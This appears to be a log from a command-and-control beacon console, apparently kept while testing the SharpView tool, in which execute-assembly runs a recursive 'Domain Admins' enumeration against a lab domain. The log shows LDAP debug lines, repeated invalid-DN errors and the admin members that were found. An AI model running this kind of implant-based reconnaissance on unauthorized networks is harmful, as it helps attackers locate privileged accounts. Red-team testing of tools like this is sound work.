`execute-assembly /root/tooltesting/SharpView.exe Get-NetGroupMember -GroupName "Domain Admins" -Recurse`
```bash
[10/20 16:28:59] beacon> execute-assembly /root/tooltesting/SharpView.exe Get-NetGroupMember -GroupName "Domain Admins" -Recurse
[10/20 16:29:49] [*] Tasked beacon to run .NET program: SharpView.exe Get-NetGroupMember -GroupName "Domain Admins" -Recurse
[10/20 16:29:50] [+] host called home, sent: 843927 bytes
[10/20 16:29:52] [+] received output:
[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=CORP,DC=LOCAL

[Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group))


[10/20 16:29:53] [+] received output:
[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=CORP,DC=LOCAL

[Get-DomainObject] Extracted domain 'corp.local' from 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=corp,DC=local

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=Domain Admins,CN=Users,DC=corp,DC=local)))

[Get-DomainGroupMember] Manually recursing on group: CN=Domain Admins,CN=Users,DC=corp,DC=local

[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=CORP,DC=LOCAL

[Get-DomainGroupMember] Extracted domain 'corp,local' from 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=corp,local

[Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(distinguishedname=CN=Domain Admins,CN=Users,DC=corp,DC=local)))

[Get-DomainGroupMember] Error searching for group with identity 'System.String[]': System.DirectoryServices.DirectoryServicesCOMException (0x80072032): An invalid dn syntax has been specified.



   at System.DirectoryServices.DirectoryEntry.Bind(Boolean throwIfFail)

   at System.DirectoryServices.DirectoryEntry.Bind()

   at System.DirectoryServices.DirectoryEntry.get_AdsObject()

   at System.DirectoryServices.DirectorySearcher.FindAll(Boolean findMoreThanOne)

   at System.DirectoryServices.DirectorySearcher.FindOne()

   at SharpView.PowerView.Get_DomainGroupMember(Args_Get_DomainGroupMember args)

[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=CORP,DC=LOCAL

[Get-DomainObject] Extracted domain 'corp.local' from 'CN=Enterprise Admins,CN=Users,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=corp,DC=local

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=Enterprise Admins,CN=Users,DC=corp,DC=local)))

[Get-DomainGroupMember] Manually recursing on group: CN=Enterprise Admins,CN=Users,DC=corp,DC=local

[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=CORP,DC=LOCAL

[Get-DomainGroupMember] Extracted domain 'corp,local' from 'CN=Enterprise Admins,CN=Users,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=corp,local

[Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(distinguishedname=CN=Enterprise Admins,CN=Users,DC=corp,DC=local)))

[Get-DomainGroupMember] Error searching for group with identity 'System.String[]': System.DirectoryServices.DirectoryServicesCOMException (0x80072032): An invalid dn syntax has been specified.



   at System.DirectoryServices.DirectoryEntry.Bind(Boolean throwIfFail)

   at System.DirectoryServices.DirectoryEntry.Bind()

   at System.DirectoryServices.DirectoryEntry.get_AdsObject()

   at System.DirectoryServices.DirectorySearcher.FindAll(Boolean findMoreThanOne)

   at System.DirectoryServices.DirectorySearcher.FindOne()

   at SharpView.PowerView.Get_DomainGroupMember(Args_Get_DomainGroupMember args)

[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=CORP,DC=LOCAL

[Get-DomainObject] Extracted domain 'corp.local' from 'CN=Administrator,CN=Users,DC=corp,DC=local'

[Get-DomainSearcher] search base: LDAP://DC01.CORP.LOCAL/DC=corp,DC=local

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=corp,DC=local)))

GroupDomain                    : corp,local

GroupName                      : Administrators

GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=corp,DC=local

MemberDomain                   : corp.local

MemberName                     : Domain Admins

MemberDistinguishedName        : CN=Domain Admins,CN=Users,DC=corp,DC=local

MemberObjectClass              : group

MemberSID                      : S-1-5-21-2291914956-3290296217-2402366952-512



GroupDomain                    : corp,local

GroupName                      : Administrators

GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=corp,DC=local

MemberDomain                   : corp.local

MemberName                     : Enterprise Admins

MemberDistinguishedName        : CN=Enterprise Admins,CN=Users,DC=corp,DC=local

MemberObjectClass              : group

MemberSID                      : S-1-5-21-2291914956-3290296217-2402366952-519



GroupDomain                    : corp,local

GroupName                      : Administrators

GroupDistinguishedName         : CN=Administrators,CN=Builtin,DC=corp,DC=local

MemberDomain                   : corp.local

MemberName                     : Administrator

MemberDistinguishedName        : CN=Administrator,CN=Users,DC=corp,DC=local

MemberObjectClass              : user

MemberSID                      : S-1-5-21-2291914956-3290296217-2402366952-500


```
